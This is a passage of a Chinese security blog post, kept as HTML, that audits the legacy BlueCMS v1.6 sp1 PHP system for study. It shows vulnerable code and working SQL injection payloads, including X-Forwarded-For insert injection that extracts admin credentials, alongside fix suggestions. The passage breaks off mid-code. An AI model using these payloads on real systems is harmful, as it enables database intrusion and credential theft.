<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.2.0"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png"><link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png"><link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png"><link rel="mask-icon" href="/images/logo.svg" color="#222"><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css"><script id="hexo-configurations">var NexT=window.NexT||{},CONFIG={hostname:"landvsec.top",root:"/",scheme:"Gemini",version:"7.7.2",exturl:!1,sidebar:{position:"left",display:"post",padding:18,offset:12,onmobile:!1},copycode:{enable:!0,show_result:!0,style:"mac"},back2top:{enable:!0,sidebar:!1,scrollpercent:!1},bookmark:{enable:!1,color:"#222",save:"auto"},fancybox:!1,mediumzoom:!1,lazyload:!1,pangu:!1,comments:{style:"tabs",active:null,storage:!0,lazyload:!1,nav:null},algolia:{hits:{per_page:10},labels:{input_placeholder:"Search for Posts",hits_empty:"We didn't find any results for the search: ${query}",hits_stats:"${hits} results found in ${time} ms"}},localsearch:{enable:!0,trigger:"auto",top_n_per_article:1,unescape:!1,preload:!1},motion:{enable:!0,async:!1,transition:{post_block:"fadeIn",post_header:"slideDownIn",post_body:"slideDownIn",coll_header:"slideLeftIn",sidebar:"slideUpIn"}},path:"search.xml"}</script><meta name="description" content="前言最近在根据 p 牛的 PHP 审计脑图学习审计，就打算找一些古早 CMS 来练习，因为课业繁忙，所以打算出《每周审计》这样一个栏目，每周审计一个 CMS ，既是督促自己学习，也是让自己能够有所沉淀。 本篇采用白盒的审计方式，会利用 Seay 一步到位，并给出相关修复建议，希望对初学的你有所帮助。 另外因 CMS 太过古老，搭建中可能会有许多问题（好与不好非常玄学），本身源码可能就有许多 bug"><meta property="og:type" content="article"><meta property="og:title" content="每周审计之BlueCMS v1.6 sp1复现"><meta property="og:url" content="https://landvsec.top/archives/ebbdc35f.html"><meta property="og:site_name" content="My Pureland"><meta property="og:description" content="前言最近在根据 p 牛的 PHP 审计脑图学习审计，就打算找一些古早 CMS 来练习，因为课业繁忙，所以打算出《每周审计》这样一个栏目，每周审计一个 CMS ，既是督促自己学习，也是让自己能够有所沉淀。 本篇采用白盒的审计方式，会利用 Seay 一步到位，并给出相关修复建议，希望对初学的你有所帮助。 另外因 CMS 太过古老，搭建中可能会有许多问题（好与不好非常玄学），本身源码可能就有许多 bug"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://i.loli.net/2020/12/01/HTVo5irclCW8pne.png"><meta property="og:image" content="https://i.loli.net/2020/11/30/VycfaYNiSoeATx1.png"><meta property="og:image" content="https://i.loli.net/2020/12/01/uvxFPYiVhtDCELw.png"><meta property="og:image" content="https://i.loli.net/2020/12/01/wLtlq2PzQ5hkrg8.png"><meta property="og:image" content="https://i.loli.net/2020/12/01/oswrzHi4fQ7I5Je.png"><meta property="og:image" content="https://i.loli.net/2020/12/01/Nxcqf3ZKeLRvkQb.png"><meta property="og:image" content="https://i.loli.net/2020/12/01/N9CYy3cStbmvAnz.png"><meta property="og:image" content="https://i.loli.net/2020/12/01/e5AFaoGId1iPMV2.png"><meta property="og:image" content="https://i.loli.net/2020/12/05/dpA17ZUiwR4xhcQ.png"><meta property="og:image" content="https://i.loli.net/2020/12/05/DWikwMObPx6aXoB.png"><meta property="og:image" content="https://i.loli.net/2020/12/05/LA1VU3Bo6XZz9Kl.png"><meta property="og:image" content="https://i.loli.net/2020/12/05/l3Ov4D7M2raiNFx.png"><meta property="og:image" content="https://i.loli.net/2020/12/05/YKuvRLck1xi9Nps.png"><meta property="og:image" content="https://i.loli.net/2020/12/05/y9xPR3QTUshuX6k.png"><meta property="og:image" content="https://i.loli.net/2020/12/05/jKH4pb6QnaXwMz2.png"><meta property="article:published_time" content="2020-11-29T01:37:05.000Z"><meta property="article:modified_time" content="2020-12-05T13:32:49.555Z"><meta property="article:author" content="landvsec"><meta property="article:tag" content="PHP审计"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://i.loli.net/2020/12/01/HTVo5irclCW8pne.png"><link rel="canonical" href="https://landvsec.top/archives/ebbdc35f.html"><script id="page-configurations">CONFIG.page={sidebar:"",isHome:!1,isPost:!0}</script><title>每周审计之BlueCMS v1.6 sp1复现 | My Pureland</title><noscript><style>.sidebar-inner,.use-motion .brand,.use-motion .collection-header,.use-motion .comments,.use-motion .menu-item,.use-motion .pagination,.use-motion .post-block,.use-motion .post-body,.use-motion .post-header{opacity:initial}.use-motion .site-subtitle,.use-motion .site-title{opacity:initial;top:initial}.use-motion .logo-line-before i{left:initial}.use-motion .logo-line-after i{right:initial}</style></noscript><link rel="alternate" href="/atom.xml" title="My Pureland" type="application/atom+xml"></head><body itemscope itemtype="http://schema.org/WebPage"><div class="container use-motion"><div class="headband"></div><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="header-inner"><div class="site-brand-container"><div class="site-nav-toggle"><div class="toggle" aria-label="切换导航栏"><span class="toggle-line toggle-line-first"></span> <span class="toggle-line toggle-line-middle"></span> <span class="toggle-line toggle-line-last"></span></div></div><div class="site-meta"><div><a href="/" class="brand" rel="start"><span class="logo-line-before"><i></i></span> <span class="site-title">My Pureland</span> <span class="logo-line-after"><i></i></span></a></div></div><div class="site-nav-right"><div class="toggle popup-trigger"><i class="fa fa-search fa-fw fa-lg"></i></div></div></div><nav class="site-nav"><ul id="menu" class="menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-fw fa-sitemap"></i>站点地图</a></li><li class="menu-item menu-item-search"><a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索</a></li></ul></nav><div class="site-search"><div class="popup search-popup"><div class="search-header"><span class="search-icon"><i class="fa fa-search"></i></span><div class="search-input-container"><input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input"></div><span class="popup-btn-close"><i class="fa fa-times-circle"></i></span></div><div id="search-result"></div></div><div class="search-pop-overlay"></div></div></div></header><div class="back-to-top"><i class="fa fa-arrow-up"></i> <span>0%</span></div><main class="main"><div class="main-inner"><div class="content-wrap"><div class="content"><div class="posts-expand"><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://landvsec.top/archives/ebbdc35f.html"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/landv.jpg"><meta itemprop="name" content="landvsec"><meta itemprop="description" content="困于山中，被鬼追逐。"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="My Pureland"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">每周审计之BlueCMS v1.6 sp1复现</h1><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2020-11-29 09:37:05" itemprop="dateCreated datePublished" datetime="2020-11-29T09:37:05+08:00">2020-11-29</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="fa fa-calendar-check-o"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2020-12-05 21:32:49" itemprop="dateModified" datetime="2020-12-05T21:32:49+08:00">2020-12-05</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="fa fa-folder-o"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">安全</span></a> </span></span><span id="/archives/ebbdc35f.html" class="post-meta-item leancloud_visitors" data-flag-title="每周审计之BlueCMS v1.6 sp1复现" title="阅读次数"><span class="post-meta-item-icon"><i class="fa fa-eye"></i> </span><span class="post-meta-item-text">阅读次数：</span> <span class="leancloud-visitors-count"></span> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="fa fa-comment-o"></i> </span><span class="post-meta-item-text">Valine：</span> <a title="valine" href="/archives/ebbdc35f.html#valine-comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/archives/ebbdc35f.html" itemprop="commentCount"></span></a></span><br><span class="post-meta-item" title="本文字数"><span class="post-meta-item-icon"><i class="fa fa-file-word-o"></i> </span><span class="post-meta-item-text">本文字数：</span> <span>13k</span> </span><span class="post-meta-item" title="阅读时长"><span class="post-meta-item-icon"><i class="fa fa-clock-o"></i> </span><span class="post-meta-item-text">阅读时长 &asymp;</span> <span>12 分钟</span></span></div></header><div class="post-body" itemprop="articleBody"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在根据 p 牛的 PHP 审计脑图学习审计，就打算找一些古早 CMS 来练习，因为课业繁忙，所以打算出《每周审计》这样一个栏目，每周审计一个 CMS ，既是督促自己学习，也是让自己能够有所沉淀。</p><p>本篇采用白盒的审计方式，会利用 Seay 一步到位，并给出相关修复建议，希望对初学的你有所帮助。</p><p>另外因 CMS 太过古老，搭建中可能会有许多问题（好与不好非常玄学），本身源码可能就有许多 bug ，建议调试修改，如果不行，建议直接放弃看漏洞部分。</p><a id="more"></a><p>环境搭建：</p><ul><li><a target="_blank" rel="noopener external nofollow noreferrer" href="https://jwt1399.lanzous.com/inPwSde6c5a">Bluecms v1.6 sp1 源码</a></li><li><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/f1tz/cnseay">Seay 源代码审计系统</a></li><li>PHPStudy php 5.4.45 nts</li></ul><p>行文如有不当，还请评论指正，谢谢！</p><h1 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h1><p>获取到源码首先要考虑重装问题。</p><p>uploads/install/index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> define(<span class="string">&#x27;IN_BLUE&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"> <span class="keyword">require_once</span>(dirname(<span class="keyword">__FILE__</span>) . <span class="string">&#x27;/include/common.inc.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 生成 install.lock 文件</span></span><br><span class="line"> <span class="keyword">if</span>(file_exists(BLUE_ROOT.<span class="string">&#x27;data/install.lock&#x27;</span>))&#123;</span><br><span class="line"> 	install_showmsg(<span class="string">&#x27;您已经安装过本系统，如果想重新安装，请删除data目录下install.lock文件&#x27;</span>, <span class="string">&#x27;../index.php&#x27;</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>对 data 目录下是否有 install.lock 文件进行了检测。</p><p>uploads/install/include/common.fun.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">install_showmsg</span>(<span class="params">$msg,$gourl=<span class="string">&#x27;goback&#x27;</span>, $is_write = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> 	<span class="keyword">global</span> $install_smarty;</span><br><span class="line"> 	$install_smarty-&gt;assign(<span class="string">&quot;msg&quot;</span>,$msg);</span><br><span class="line"> 	$install_smarty-&gt;assign(<span class="string">&quot;gourl&quot;</span>,$gourl);</span><br><span class="line"> 	$install_smarty-&gt;display(<span class="string">&quot;showmsg.htm&quot;</span>);</span><br><span class="line"> 	<span class="keyword">exit</span>();</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>这里有 <code>exit()</code> 并无重装漏洞。</p><p>安装后，我们先随便注册一个用户账号，然后访问 uploads/admin ，用之前安装时管理员账密登录，把一些比如新闻栏目之类的添加好（默认空），方便我们进行测试。</p><p>再列出整个 CMS 的功能板块，括号内是自觉有测试价值的部分：</p><p><img src="https://i.loli.net/2020/12/01/HTVo5irclCW8pne.png" style="zoom:150%"></p><p>接下来用 Seay 自动化审计一遍。</p><p><img src="https://i.loli.net/2020/11/30/VycfaYNiSoeATx1.png" style="zoom:80%"></p><p>首先来分析其中的 SQL注入漏洞。</p><h2 id="SQL-注入漏洞"><a href="#SQL-注入漏洞" class="headerlink" title="SQL 注入漏洞"></a>SQL 注入漏洞</h2><p>因有些 SQL 语句拼接前根本没有过滤，所以部分只演示爆库过程，其余爆表列可自行修改对应语句，另外因为代码注入漏洞实在太多了（毕竟是 2010 年的），这里只给出部分样例。</p><h3 id="前台"><a href="#前台" class="headerlink" title="前台"></a>前台</h3><h4 id="普通-SQL-注入"><a href="#普通-SQL-注入" class="headerlink" title="普通 SQL 注入"></a>普通 SQL 注入</h4><p>uploads/ad_js.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ad_id = !<span class="keyword">empty</span>($_GET[<span class="string">&#x27;ad_id&#x27;</span>]) ? trim($_GET[<span class="string">&#x27;ad_id&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">...</span><br><span class="line">$ad = $db-&gt;getone(<span class="string">&quot;SELECT * FROM &quot;</span>.table(<span class="string">&#x27;ad&#x27;</span>).<span class="string">&quot; WHERE ad_id =&quot;</span>.$ad_id);</span><br></pre></td></tr></table></figure><p><code>ad_id</code> 只去除了两侧的空白字符。</p><p>uploads/include/mysql.class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getone</span>(<span class="params">$sql, $type=MYSQL_ASSOC</span>)</span>&#123;</span><br><span class="line">    	$query = <span class="keyword">$this</span>-&gt;query($sql,<span class="keyword">$this</span>-&gt;linkid);</span><br><span class="line">    	$row = mysql_fetch_array($query, $type);</span><br><span class="line">    	<span class="keyword">return</span> $row;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>getone</code> 查询数组返回。</p><p>几乎是没有过滤，只不过页面回显在源码中，可以改成下面这样方便观察：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ad_content = str_replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\&quot;&#x27;</span>,$ad_content);</span><br><span class="line">$ad_content = str_replace(<span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\\r&quot;</span>,$ad_content);</span><br><span class="line">$ad_content = str_replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;\\n&quot;</span>,$ad_content);</span><br><span class="line">[-] <span class="keyword">echo</span> <span class="string">&quot;&lt;!--\r\ndocument.write(\&quot;&quot;</span>.$ad_content.<span class="string">&quot;\&quot;);\r\n--&gt;\r\n&quot;</span>;</span><br><span class="line">[+] <span class="keyword">echo</span> $ad_content;</span><br></pre></td></tr></table></figure><p>简单联合注入就能拿到管理员账密，密码是 md5 加密的，somd5 网站解密就行。</p><p><strong>修复建议</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[-] $ad_id = !<span class="keyword">empty</span>($_GET[<span class="string">&#x27;ad_id&#x27;</span>]) ? trim($_GET[<span class="string">&#x27;ad_id&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">[+] $ad_id = !<span class="keyword">empty</span>($_GET[<span class="string">&#x27;ad_id&#x27;</span>]) ? intval($_GET[<span class="string">&#x27;ad_id&#x27;</span>]) : <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p><code>intval</code> 获取变量的整数值，这样就无法把其他特殊字符输入了。</p><h4 id="XFF-注入"><a href="#XFF-注入" class="headerlink" title="XFF 注入"></a>XFF 注入</h4><p><img src="https://i.loli.net/2020/12/01/uvxFPYiVhtDCELw.png" alt=""></p><p>漏洞成因主要是 uploads/include/common.fun.php 中的 <code>getip()</code> 这个方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getip</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 可以伪造 ip</span></span><br><span class="line">	<span class="keyword">if</span> (getenv(<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		$ip = getenv(<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>); </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">elseif</span> (getenv(<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>)) </span><br><span class="line">	&#123; <span class="comment">//获取客户端用代理服务器访问时的真实ip 地址</span></span><br><span class="line">		$ip = getenv(<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">elseif</span> (getenv(<span class="string">&#x27;HTTP_X_FORWARDED&#x27;</span>)) </span><br><span class="line">	&#123; </span><br><span class="line">		$ip = getenv(<span class="string">&#x27;HTTP_X_FORWARDED&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">elseif</span> (getenv(<span class="string">&#x27;HTTP_FORWARDED_FOR&#x27;</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		$ip = getenv(<span class="string">&#x27;HTTP_FORWARDED_FOR&#x27;</span>); </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">elseif</span> (getenv(<span class="string">&#x27;HTTP_FORWARDED&#x27;</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		$ip = getenv(<span class="string">&#x27;HTTP_FORWARDED&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123; </span><br><span class="line">		$ip = $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $ip;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>CLIENT_IP</code>、<code>X_FORWARDED_FOR</code> 都可以被伪造，我们全局搜索项目中有用到 <code>getip()</code> 的部分，看是否有利用之处：</p><p><img src="https://i.loli.net/2020/12/01/wLtlq2PzQ5hkrg8.png" style="zoom:80%"></p><p>uploads/comment.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">&quot;INSERT INTO &quot;</span>.table(<span class="string">&#x27;comment&#x27;</span>).<span class="string">&quot; (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) </span></span><br><span class="line"><span class="string"> 			VALUES (&#x27;&#x27;, &#x27;<span class="subst">$id</span>&#x27;, &#x27;<span class="subst">$user_id</span>&#x27;, &#x27;<span class="subst">$type</span>&#x27;, &#x27;<span class="subst">$mood</span>&#x27;, &#x27;<span class="subst">$content</span>&#x27;, &#x27;<span class="subst">$timestamp</span>&#x27;, &#x27;&quot;</span>.getip().<span class="string">&quot;&#x27;, &#x27;<span class="subst">$is_check</span>&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure><p>第三处的 <code>online_ip</code> 被用在 uploads/guest_book.php 中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">&quot;INSERT INTO &quot;</span> . table(<span class="string">&#x27;guest_book&#x27;</span>) . <span class="string">&quot; (id, rid, user_id, add_time, ip, content) </span></span><br><span class="line"><span class="string">			VALUES (&#x27;&#x27;, &#x27;<span class="subst">$rid</span>&#x27;, &#x27;<span class="subst">$user_id</span>&#x27;, &#x27;<span class="subst">$timestamp</span>&#x27;, &#x27;<span class="subst">$online_ip</span>&#x27;, &#x27;<span class="subst">$content</span>&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure><p>都是 insert 注入，这里以 guest_book 页面（即留言板）注入为演示，另外一例同理，因为 <code>online_ip</code> 正好是倒数第二个参数，最后的参数修改为我们需要查询的语句，再括号闭合注释掉后面的 <code>content</code> ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:127.0.0.1&#39;,database());-- +</span><br></pre></td></tr></table></figure><p>拼接效果</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> blue_guest_book (<span class="keyword">id</span>, rid, user_id, add_time, ip, <span class="keyword">content</span>) <span class="keyword">VALUES</span> (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;$rid&#x27;</span>, <span class="string">&#x27;$user_id&#x27;</span>, <span class="string">&#x27;$timestamp&#x27;</span>, <span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="keyword">database</span>());</span><br><span class="line"><span class="comment">-- +, &#x27;$content&#x27;)&quot;;</span></span><br></pre></td></tr></table></figure><p>这里不知道为什么总是提示留言为空，可以直接把代码中的提示信息注释掉。</p><p><img src="https://i.loli.net/2020/12/01/oswrzHi4fQ7I5Je.png" style="zoom:80%"></p><p><img src="https://i.loli.net/2020/12/01/Nxcqf3ZKeLRvkQb.png" style="zoom:80%"></p><p>另外还有 payload 我觉得可以学习一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1&#39;, &#39;123&#39;),(&#39;&#39;,&#39;1&#39;,&#39;0&#39;,&#39;1&#39;,&#39;6&#39;,(select concat(&#39;&lt;u-&#39;,admin_name,&#39;-u&gt;&lt;p-&#39;,pwd,&#39;-p&gt;&#39;) from blue_admin), &#39;1281181973&#39;,&#39;99</span><br></pre></td></tr></table></figure><p>是对 comment.php 的注入，拼接效果：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> blue_comment (com_id, post_id, user_id, <span class="keyword">type</span>, mood, <span class="keyword">content</span>, pub_date, ip, is_check) <span class="keyword">VALUES</span> (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;$id&#x27;</span>, <span class="string">&#x27;$user_id&#x27;</span>, <span class="string">&#x27;$type&#x27;</span>, <span class="string">&#x27;$mood&#x27;</span>, <span class="string">&#x27;$content&#x27;</span>, <span class="string">&#x27;$timestamp&#x27;</span>, <span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,(<span class="keyword">select</span> <span class="keyword">concat</span>(<span class="string">&#x27;&lt;u-&#x27;</span>,admin_name,<span class="string">&#x27;-u&gt;&lt;p-&#x27;</span>,pwd,<span class="string">&#x27;-p&gt;&#x27;</span>) <span class="keyword">from</span> blue_admin), <span class="string">&#x27;1281181973&#x27;</span>,<span class="string">&#x27;99&#x27;</span>,$is_check<span class="string">&#x27;)&quot;;</span></span><br></pre></td></tr></table></figure><p>是插入了两条数据，只不过相比起第一种还是有些麻烦。</p><p><strong>修复建议</strong></p><p>过滤 HTTP 头中的 X-FORWARDED-FOR、CLIENT-IP header 中的内容，不允许其插入敏感字符，过滤字符参考 SQL 注入修复方案。</p><h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><p>因数据库编码是 GBK ，所以绝大可能存在宽字节注入，其他无过滤（甚至无单引号保护）的我们不需要考虑。只关注那些有用转义（即在字符串中的符号前加上 <code>\</code> ）的函数 <code>addslashes</code> 、<code>mysql_real_escape_string</code>、<code>mysql_escape_string</code> 等，还有一种情况是 <code>magic_quote_gpc</code> ，PHP 6 删除了这个选项，但我们是 PHP 5.x 。</p><p>uploads/admin/login.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$admin_name = <span class="keyword">isset</span>($_POST[<span class="string">&#x27;admin_name&#x27;</span>]) ? trim($_POST[<span class="string">&#x27;admin_name&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$admin_pwd = <span class="keyword">isset</span>($_POST[<span class="string">&#x27;admin_pwd&#x27;</span>]) ? trim($_POST[<span class="string">&#x27;admin_pwd&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span>(check_admin($admin_name, $admin_pwd))&#123;</span><br><span class="line"> 		update_admin_info($admin_name);</span><br><span class="line"> 		...</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>上述文件包含的文件 uploads/admin/include/common.inc.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!get_magic_quotes_gpc())</span><br><span class="line">&#123;</span><br><span class="line">	$_POST = deep_addslashes($_POST);</span><br><span class="line">	$_GET = deep_addslashes($_GET);</span><br><span class="line">	$_COOKIES = deep_addslashes($_COOKIES);</span><br><span class="line">	$_REQUEST = deep_addslashes($_REQUEST);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果 <code>magic_quotes_gpc</code> 为 OFF ，就采用下面的函数转义，可以看到超全局变量都用了这个函数，我们上面的账密参数就是。</p><p><code>deep_addslashes</code> 函数 uploads/include/common.fun.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deep_addslashes</span>(<span class="params">$str</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(is_array($str))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">foreach</span>($str <span class="keyword">as</span> $key=&gt;$val)</span><br><span class="line">		&#123;</span><br><span class="line">			$str[$key] = deep_addslashes($val);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		$str = addslashes($str);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简而言之，数据全部 <code>addslashes</code> 。</p><p>uploads/admin/include/common.fun.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_admin</span>(<span class="params">$name, $pwd</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $db;</span><br><span class="line">	$row = $db-&gt;getone(<span class="string">&quot;SELECT COUNT(*) AS num FROM &quot;</span>.table(<span 